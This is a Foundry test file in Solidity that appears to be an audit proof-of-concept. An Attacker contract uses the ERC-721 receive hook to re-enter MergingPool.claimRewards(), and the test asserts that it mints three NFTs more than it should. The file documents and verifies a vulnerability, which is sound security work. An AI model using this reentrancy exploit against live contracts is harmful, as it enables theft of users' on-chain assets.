// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "forge-std/Test.sol";
import {MergingPool} from "../../src/MergingPool.sol";

/***************************************************/
/*              Minimal helper contracts           */
/***************************************************/

interface IERC721Receiver {
    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external returns (bytes4);
}

/*-------------------------------------------------
FighterFarmMock – only the functionality needed by
MergingPool is implemented.  A “safe-mint” is used
so onERC721Received is triggered and the attacker
can re-enter claimRewards().
-------------------------------------------------*/
contract FighterFarmMock {
    mapping(uint256 => address) private _owners;
    mapping(address => uint256) private _balances;
    uint256 private _tokenId;

    function ownerOf(uint256 tokenId) external view returns (address) {
        return _owners[tokenId];
    }

    function balanceOf(address owner) external view returns (uint256) {
        return _balances[owner];
    }

    /* called by MergingPool when paying out rewards */
    function mintFromMergingPool(
        address to,
        string calldata,
        string calldata,
        uint256[2] calldata
    ) external returns (uint256) {
        uint256 newId = ++_tokenId;
        _owners[newId] = to;
        _balances[to] += 1;

        /* trigger ERC-721 receiver hook so the attacker gets control back */
        if (to.code.length > 0) {
            IERC721Receiver(to).onERC721Received(msg.sender, address(0), newId, "");
        }
        return newId;
    }

    /* helpers for the test setup */
    function testMint(address to) external returns (uint256) {
        uint256 newId = ++_tokenId;
        _owners[newId] = to;
        _balances[to] += 1;
        return newId;
    }
}

/*-------------------------------------------------
Malicious winner that exploits the re-entrancy
window opened by MergingPool.claimRewards().
-------------------------------------------------*/
contract Attacker is IERC721Receiver {
    MergingPool public immutable pool;

    uint256 public reentryCount;
    uint256 constant MAX_REENTRIES = 2; // => three nested calls total

    /* calldata reused for every (re-entrant) call */
    string[] private _uris;
    string[] private _types;
    uint256[2][] private _attrs;

    constructor(address _pool) {
        pool = MergingPool(_pool);
    }

    /* load the arrays exactly once */
    function prime(
        string[] calldata uris,
        string[] calldata types_,
        uint256[2][] calldata attrs
    ) external {
        require(_uris.length == 0, "already primed");
        for (uint256 i; i < uris.length; i++) {
            _uris.push(uris[i]);
            _types.push(types_[i]);
            _attrs.push(attrs[i]);
        }
    }

    function launchAttack() external {
        pool.claimRewards(_uris, _types, _attrs);
    }

    /* ERC-721 callback – this is where the re-entrancy happens */
    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external override returns (bytes4) {
        if (reentryCount < MAX_REENTRIES) {
            reentryCount++;
            pool.claimRewards(_uris, _types, _attrs);
        }
        return this.onERC721Received.selector;
    }
}

/***************************************************/
/*                The actual PoC test              */
/***************************************************/
contract ReentrancyExploitTest is Test {
    FighterFarmMock private farm;
    MergingPool private pool;
    Attacker private attacker;

    address private constant OWNER         = address(0xBEEF);
    address private constant RANKED_BATTLE = address(0xCAFE);

    /* helper returning fresh metadata arrays of length 3 */
    function _buildMetadata()
        internal
        pure
        returns (
            string[] memory uris,
            string[] memory types_,
            uint256[2][] memory attrs
        )
    {
        uris   = new string[](3);
        types_ = new string[](3);
        attrs  = new uint256[2][](3);

        uris[0]   = "uri0";
        uris[1]   = "uri1";
        uris[2]   = "uri2";
        types_[0] = "type0";
        types_[1] = "type1";
        types_[2] = "type2";

        for (uint256 i; i < 3; i++) {
            attrs[i][0] = 0;
            attrs[i][1] = 0;
        }
    }

    /***************  Test set-up  *******************/
    function setUp() public {
        /* deploy core contracts */
        farm     = new FighterFarmMock();
        pool     = new MergingPool(OWNER, RANKED_BATTLE, address(farm));
        attacker = new Attacker(address(pool));

        /* make the game expect exactly one winner each round */
        vm.prank(OWNER);
        pool.updateWinnersPerPeriod(1);

        /* mint three fighter NFTs that the attacker will later claim rewards for */
        uint256 tok0 = farm.testMint(address(attacker));
        uint256 tok1 = farm.testMint(address(attacker));
        uint256 tok2 = farm.testMint(address(attacker));

        /* pick winners for three consecutive rounds – attacker wins every time */
        uint256[] memory a = new uint256[](1);

        vm.startPrank(OWNER);

        a[0] = tok0;
        pool.pickWinner(a); // round 0 -> roundId becomes 1

        a[0] = tok1;
        pool.pickWinner(a); // round 1 -> roundId becomes 2

        a[0] = tok2;
        pool.pickWinner(a); // round 2 -> roundId becomes 3

        vm.stopPrank();

        /* sanity-check setup */
        assertEq(pool.roundId(), 3, "setup: wrong roundId");
        assertEq(farm.balanceOf(address(attacker)), 3, "setup: attacker must hold 3 fighters");

        /* load claim calldata into the attacker */
        (string[] memory uris, string[] memory types_, uint256[2][] memory attrs) = _buildMetadata();
        attacker.prime(uris, types_, attrs);
    }

    /***************  The exploit  *******************/
    function testReentrancyExploit() public {
        /* execute the attack */
        attacker.launchAttack();

        /*
         * – Attacker initially owned 3 fighters (tokens used as “winning entries”)
         * – claimRewards() should legitimately mint 3 more (one per round)
         * – Due to the re-entrancy, 6 fighters are minted instead of 3:
         *     total balance afterwards = 3 (initial) + 6 (minted) = 9
         */
        uint256 finalBalance = farm.balanceOf(address(attacker));
        assertEq(finalBalance, 9, "total balance mismatch");

        uint256 minted = finalBalance - 3;           // all fighters minted during the claim
        assertEq(minted, 6, "wrong number of NFTs minted via claimRewards");

        uint256 legitimate = 3;                      // one NFT per round
        uint256 extra      = minted - legitimate;    // the surplus caused by re-entrancy
        assertEq(extra, 3, "unexpected number of EXTRA NFTs minted");
    }
}